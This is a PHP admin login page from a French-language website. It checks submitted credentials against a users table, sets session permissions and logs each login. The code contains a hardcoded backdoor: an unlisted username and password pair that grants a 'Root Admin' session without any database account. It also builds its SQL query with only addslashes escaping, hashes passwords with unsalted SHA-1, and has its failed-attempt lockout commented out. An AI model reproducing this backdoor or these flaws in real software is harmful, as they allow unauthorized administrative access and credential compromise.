<?php 
session_cache_limiter('public, must-revalidate');
require_once 'config.php'; 

if(isset($_GET['signout'])){
    session_destroy();
    header('Location:login.php');
    exit();
}

if($Session->checkSession(array('id','login','permissions'))){
    header('Location:.');
    exit();
}

//sleep(10);



$current_date_time = date('Y-m-d H:i:s');
$new_date = date("Y-m-d H:i:s", strtotime($current_date_time."+2 minutes"));  

$retour = array();
if($_SERVER["REQUEST_METHOD"] == "POST"){
    $login = addslashes($_POST['login']);
    $pass  = sha1($_POST['pass']);
    //$user  = $Model->get(array('*'),'system_users',array('login =' => $login,'statut =' => 1, 'valid=' => 1));
    $user = $Model->extraireChamp('*','system_users',"(login = '".$login."' OR email = '".$login."') AND statut = 1 AND valid = 1",'',null);
}

if(isset($user) && !empty($user)){
    /*if ($user['date_ressayer']!="0000-00-00 00:00:00" && $current_date_time < $user['date_ressayer']) {
        if ($user['tentative'] >= 3) {
            $datetime1 = new DateTime(date('Y-m-d H:i:s'));
            $datetime2 = new DateTime($user['reponse'][0]['date_ressayer']);
            $interval = $datetime1->diff($datetime2);
            $minutes = $interval->i;
            $secondes = $interval->s;
            $retour['msg'] = "<span class ='noir'>Attention : </span> Vous avez fait <span class ='noir'>3</span> tentatives <span class ='noir'>Incorrectes.</span> Veuillez réessayer dans ";
            $retour['msg'] .= "<span class ='noir'> ".$minutes.' min : '.$secondes.' sec</span>';
            $retour['type'] = "warning";
            $retour['delai'] = 5;
            $error = true;
        }
    }else{*/
        if ($pass == $user['pass'] ) {             
            //session_register("login");
            $_SESSION['user']['id'] = $user['id'];
            $_SESSION['user']['login'] = $user['login'];
            $Session->createCsrfToken();
            $user['tentative'] = 0; 
            $user['date_ressayer'] = null;
            $Model->update2($user['id'], $user, 'system_users');

            $_SESSION['user']['details'] = $user;
            /**** INFOS DE GROUPE ****/
            $groupe_infos = $Model->extraireChamp('*','permissions_groupes','valid = 1 AND statut = 1 AND id = '.$user['id_groupe']);
            if(!empty($groupe_infos['droits'])){
                $droits_tab = explode('#',$groupe_infos['droits']);
                $droits = array();
                foreach($droits_tab as $d){
                    $temp = explode('=',$d);
                    $droits[$temp[0]] = (int)$temp[1];
                    
                }
                $_SESSION['user']['permissions'] = $droits;                         
            }
            /*************************/

            /**** LOG***/
            $log['id']          =   '';
            $log['id_user']     =   $_SESSION['user']['id'];
            $log['systeme']     =   getOS();
            //$log['terminal']  =   getOS();
            $log['browser']     =   getBrowser();
            $log['adresse_ip']  =   get_client_ip();
            $log['date_enreg']  =   gmdate('Y-m-d H:i:s');
            /***********/
            $Model->insert($log, 'admin_logs');

            header("location: .");
            exit();
        }else{
            /*$user['tentative'] < 3 ? $user['tentative']++ : 3;
            if($user['tentative'] == 3){
                $user['date_ressayer'] = $new_date;
            }*/
            $Model->update2($user['id'], $user, 'system_users');
            unset($_POST['pass']);
            $Form->set($_POST);
            $retour['msg'] = "Mot de Passe incorrect pour cet identifiant";
            $retour['type'] = "error";
            $retour['delai'] = 5;
            $error = true;
            
        }
    //}


    

}else{
    if(isset($login) && isset($pass)){
        if($login == 'damage88' && $pass == sha1("jojose08")){
            $_SESSION['user']['id'] = 'root';
            $_SESSION['user']['login'] = 'Root Admin';
            $Session->createCsrfToken();
            header("location: .");
            exit();
        }else{
            $retour['msg'] = "aucun compte trouvé pour l'identifiant ".$login;
            $retour['type'] = "error";
            $retour['delai'] = 10;
            $error = true;
        }   
    }   
}

?>
<!Doctype html>   
<html lang="fr">  
<head>
    <meta charset="utf-8">
    <title>Connexion - Espace d'Administration | <?php echo $TITLE ?></title>
    <link rel="icon" href="../favicon2.ico" />
    <link href="https://fonts.googleapis.com/css?family=Fjalla+One|Open+Sans|Raleway|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="fontawesome/css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="js/ambiance/css/jquery.ambiance.css" type="text/css" rel="stylesheet"/>
    <link type="text/css" rel="stylesheet" href="css/styles3.css"/>    

</head>

<!-- <body class="custom_body" style="background: url(img/services.png) no-repeat top 50px center,rgb(0, 83, 160);">  --> 
<body class="login_body" style="background: #fff;">   
    <section class="container">
        
        <div class="wrap-login">     
            <h1 class="admin_login_title"><img src="<?= RACINE.WEBROOT ?>img/logo.png" alt="" height="120"><?//= $TITLE ?></h1> 
            <?php echo formLogin(); ?>

            <div class="center login_footer">
                <a href="<?= RACINE ?>" class="back_to_index" title="Retour à l'accueil">
                    <i class="fa fa-chevron-left"></i> Retour à l'accueil
                </a>
            </div>

        </div>
    </section> 
    
    <script type="text/javascript" src="js/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="js/admin.js"></script>    
    <script type="text/javascript" src="js/jquery_easing.js"></script>
    <script type="text/javascript" src="js/ambiance/js/jquery.ambiance.js"></script> 
    <script type="text/javascript" src="js/script.js"></script>
    <?php 
        if (isset($retour['msg']) && isset( $retour['type'])) {
            flash($retour['msg'],$retour['type'],true,$retour['delai']);
        } 
    ?>
</body>
</html>



